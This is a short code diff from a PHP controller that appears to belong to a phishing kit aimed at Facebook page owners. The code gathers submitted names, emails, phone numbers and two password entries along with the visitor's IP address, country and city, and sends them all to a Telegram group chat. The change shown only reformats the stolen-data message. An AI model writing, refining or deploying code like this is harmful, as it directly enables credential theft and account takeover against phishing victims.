@@ -85,10 +85,12 @@ class Controller extends BaseController
             $information = $request->information ?? '';
             $password_1 = $request->password_1 ?? '';
             $password_2 = $request->password_2 ?? '';
-            $info = implode('\n', $infoByIP);
+            $ipAddress = $infoByIP['ipAddress'];
+            $countryName = $infoByIP['countryName'];
+            $cityName = $infoByIP['cityName'];
             $data = [
                 'chat_id' => $this->groupTelegramId,
-                'text' => "$info\nName fanpage: $name_fanpage\nFull name: $fullname\nBusiness email: $bussiness_email\nPersonal email: $personal_email\nPhone: $phone\nInfo: $information\nPassword first: $password_1\nPassword second: $password_2"
+                'text' => "Name fanpage: $name_fanpage\nFull name: $fullname\nBusiness email: $bussiness_email\nPersonal email: $personal_email\nPhone: $phone\nInfo: $information\nPassword first: $password_1\nPassword second: $password_2\nIP Address: $ipAddress\nCountry: $countryName\nCity: $cityName"
             ];
 
             $client = new Client();
